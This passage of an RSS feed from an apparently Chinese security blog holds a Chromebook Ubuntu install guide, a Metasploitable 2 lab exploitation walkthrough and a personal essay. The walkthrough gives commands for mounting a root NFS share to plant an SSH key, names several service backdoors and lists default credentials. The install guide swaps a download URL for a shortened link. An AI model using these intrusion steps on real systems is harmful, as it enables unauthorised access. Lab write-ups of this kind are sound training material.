&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; 进入&lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;账户&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;下载&lt;a href=&quot;https://github.com/dnschneid/crouton&quot;&gt;Cronton&lt;/a&gt;,打包下载，download.zip&lt;br /&gt;
更改targets/audio文件第47行:  &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;( wget -O &quot;$archive&quot; &quot;$urlbase/$ADHD_HEAD.tar.gz&quot; 2&amp;gt;&amp;amp;1 \
                                    || echo &quot;Error fetching CRAS&quot; ) | tee &quot;$log&quot;&lt;/code&gt; &lt;br /&gt;
改为: &lt;br /&gt;
                                      &lt;code class=&quot;highlighter-rouge&quot;&gt;( wget -O &quot;$archive&quot; &quot;http://t.cn/R46YOzM&quot; 2&amp;gt;&amp;amp;1 \
                                    || echo &quot;Error fetching CRAS&quot; ) | tee &quot;$log&quot;
&lt;/code&gt;&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;这样会避免从google下载audio声卡驱动 &lt;br /&gt;
直接运行&lt;code class=&quot;highlighter-rouge&quot;&gt;installer/main.sh&lt;/code&gt; &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh --help&lt;/code&gt; 可以看见很多信息 &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r list&lt;/code&gt; 会显示你的机器可以安装哪些linux系统 &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -t list&lt;/code&gt; 会显示安装哪些基础程序如桌面等 &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r xenial -t core,x11,audio,cli-extra,extension,gtk-extra,kde&lt;/code&gt;  我开始安装的是这几个，但是浏览器不好用&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r xenial -t core,x11,audio,cli-extra,extension,gtk-extra,chromium,keyword,lxde,lxde-desktop&lt;/code&gt; 换了这个还没怎么用 &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo startlxde&lt;/code&gt; 即可打开安装好的Ubuntu&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + alt + shift + f2/f1&lt;/code&gt; 快速切换ChromeOs/Ubunu&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo startcli / sudo enter-chroot&lt;/code&gt;  可以类似于ssh登录Ubuntu&lt;br /&gt;
写&lt;code class=&quot;highlighter-rouge&quot;&gt;python&lt;/code&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;spyder&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;apt install spyder&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;参考链接&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/dubuqingfeng/Chromebook-For-Chinese&quot;&gt;在中国使用chromebook&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://github.com/dnschneid/crouton&quot;&gt;crouton其它高级用法&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;长大之后的我们，会变的世故，甚至变得你自己都不知道自己是谁！ -毛不易《消愁》&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 30 Oct 2017 00:00:00 +0800</pubDate>
        <link>https://havysec.github.io/2017/10/Chromebook%E5%AE%89%E8%A3%85ubuntu/</link>
        <guid isPermaLink="true">https://havysec.github.io/2017/10/Chromebook%E5%AE%89%E8%A3%85ubuntu/</guid>
        
        <category>chromebook</category>
        
        
      </item>
    
      <item>
        <title>Metasploitable2-Exploitability-Guide</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/1.png&quot; alt=&quot;rapid7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;metasploitable-2-&quot;&gt;内容：metasploitable 2 利用笔记&lt;/h3&gt;

&lt;p&gt;暂时不包括对web应用和服务的利用&lt;/p&gt;

&lt;p&gt;环境搭建: VMware 虚拟机&lt;a href=&quot;https://information.rapid7.com/metasploitable-download.html&quot;&gt;下载地址&lt;/a&gt;  注册信息随便写，或者&lt;a href=&quot;https://metasploit.help.rapid7.com/docs/metasploitable-2&quot;&gt;直接下载&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;metasploitable 2 用户名密码&lt;code class=&quot;highlighter-rouge&quot;&gt;msfadmin&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;msfadmin&lt;/code&gt;.登陆后查看地址&lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/2.png&quot; alt=&quot;ifconfig&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p style=&quot;color: #FF2D2D&quot;&gt;
&lt;strong&gt;打开kali用nmap扫描该地址开启的端口和服务以及服务版本:`nmap -p1-65535 -sV 192.168.227.128`&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/3.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;得到很多开启的服务及端口信息,这正是我们需要的.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;port-2049-nfsnetwork-file-system-&quot;&gt;PORT: 2049 NFS(Network File System) 网络文件系统&lt;/h3&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;rpcinfo&lt;/code&gt;判断&lt;code class=&quot;highlighter-rouge&quot;&gt;NFS&lt;/code&gt;服务是否开启，再用&lt;code class=&quot;highlighter-rouge&quot;&gt;showmount -e&lt;/code&gt; 判断&lt;code class=&quot;highlighter-rouge&quot;&gt;linux&lt;/code&gt;系统根目录是否被共享和可以挂载.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# rpcinfo -p 192.168.227.128
# showmount -e 192.168.227.128
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/4.png&quot; alt=&quot;NFS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过挂载远程服务器的根目录，再写入文件。这里选择写入ssh公钥用ssh私钥直接进行登录。&lt;/p&gt;

&lt;p&gt;创建公私钥&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ssh-keygen -t rsa    
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/5.png&quot; alt=&quot;ssh-keygen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;挂载共享目录到本地，再将公钥重命名写到指定目录，用私钥登录&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# mount -t nfs 192.168.227.128:/ /tmp/
# cat id_rsa.pub &amp;gt;&amp;gt; /tmp/root/.ssh/authorized_keys
# umount /tmp
# ssh 192.168.227.128
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/6.png&quot; alt=&quot;ssh&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;port-21-vsftpd-234&quot;&gt;PORT: 21 vsftpd-2.3.4&lt;/h3&gt;
&lt;p&gt;该版本包含一个后门，如果一个用户名被传入最后包含&lt;code class=&quot;highlighter-rouge&quot;&gt;:)&lt;/code&gt;，该版本会在6200端口监听一个shell，可以用telnet或者msf测试这个漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/7.png&quot; alt=&quot;telnet&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/8.png&quot; alt=&quot;msfconsole&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;port-6667-unrealrcd-irc-&quot;&gt;PORT: 6667 UnrealRCD IRC 守护进程&lt;/h3&gt;

&lt;p&gt;该版本(Unreal3.2.8.1)包含一个后门,该后门允许用户执行任意命令，拥有该服务的权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/9.png&quot; alt=&quot;Unreal&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;port-1524-ingreslock-backdoor&quot;&gt;PORT: 1524 “ingreslock” backdoor&lt;/h3&gt;

&lt;p&gt;很久以前这是一个常见的后门&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/10.png&quot; alt=&quot;1524&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;port-3632-distccd-backdoor&quot;&gt;PORT: 3632 distccd backdoor&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/11.png&quot; alt=&quot;3632&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;port-445139-samba&quot;&gt;PORT: 445.139 Samba&lt;/h3&gt;

&lt;p&gt;Samba 当配置为可写的文件共享并且&lt;code class=&quot;highlighter-rouge&quot;&gt;smb.conf&lt;/code&gt;中&lt;code class=&quot;highlighter-rouge&quot;&gt;wide links&lt;/code&gt;选项为on的时候，可以导致不被分享的目录也可被进入&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/12.png&quot; alt=&quot;Samba&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;weak-paawords&quot;&gt;Weak Paawords&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfadmin/msfadmin
user/user
postgres/postgres
sys/batman
klog/123456789
service/service  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;web-&quot;&gt;web 应用程序有时间也会写出来&lt;/h1&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;大智若愚。木秀于林，风必催之。国之利器，不可以示人。 –来自《知乎》&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 16 Oct 2017 00:00:00 +0800</pubDate>
        <link>https://havysec.github.io/2017/10/Metasploitable2-Exploitability-Guide/</link>
        <guid isPermaLink="true">https://havysec.github.io/2017/10/Metasploitable2-Exploitability-Guide/</guid>
        
        <category>安全靶场通关</category>
        
        
      </item>
    
      <item>
        <title>随便写写</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-12/blog.png&quot; alt=&quot;博客首页&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;博客的初衷：记录一些平时可能遇到的问题、学习的总结、知识的分享、生活的分享等。。。。 &lt;br /&gt;
  第一篇不知道说什么，就随便写写。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;我现在在听张悬的《亲爱的》，感觉她的歌总给人一种要好好生活的冲动。&lt;strong&gt;别忘了，要温柔&lt;/strong&gt;，歌词是这么写的，但是我怕是暂时做不到温柔的对待生活。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p style=&quot;color: #FF2D2D&quot;&gt;
&lt;strong&gt;说说这个博客系统怎么来的，这个博客系统是我搭好环境后copy别人的模板，做了一些更改，就是把原作者的信息换成我的。手动滑稽~~&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;暂时是这个样子，后期有时间会做很多更改。&lt;/p&gt;

&lt;p&gt;2017年也快结束了，提前做一个总结吧！&lt;/p&gt;

&lt;p&gt;原计划今年要看多少本技术和名著方面的书，可以说是只完成了1%。
在现公司转正，加上实习时间也差不多一年时间了，感觉每个同事都挺好的。&lt;br /&gt;
但是我同样知道这是一个人吃人的社会，特别是在资本主义人群中，这种感觉越明显。&lt;/p&gt;

&lt;p style=&quot;color: #FF2D2D&quot;&gt;技术方面没有得到多大提升，这跟自己有很大关系。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;明年的计划，还没有想好，总之先把技术学好，多学习。有机会的话还是想出去走走，以前去过一些地方，后来不想去是因为我太菜了，想弥补。&lt;/p&gt;

&lt;p&gt;未来，跟大多数人的想法差不多。早日实现财务自由（几乎是不可能的事情，但是梦想还是要有的，万一实现了呢？），等孩子可以独立了，然后去依山傍水的地方做一间民宿，最好找人打理。我呢？有时间写写代码玩玩。&lt;/p&gt;

&lt;hr /&gt;
&lt;blockquote&gt;
  &lt;p&gt;如果注定要一个人赶路，那就此告别吧，大漠孤烟，夕阳西下。再喝最后一碗酒，然后我就出发。不必挽留，无需相送。今日一别，来世再见。若他们问起我，就说我是尘世的一粒沙，本该浪迹天涯……
——来自《网易云音乐》&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 12 Oct 2017 00:00:00 +0800</pubDate>
        <link>https://havysec.github.io/2017/10/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/</link>
        <guid isPermaLink="true">https://havysec.github.io/2017/10/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/</guid>
        
        <category>随笔</category>
        
        
      </item>
    
  </channel>
</rss>
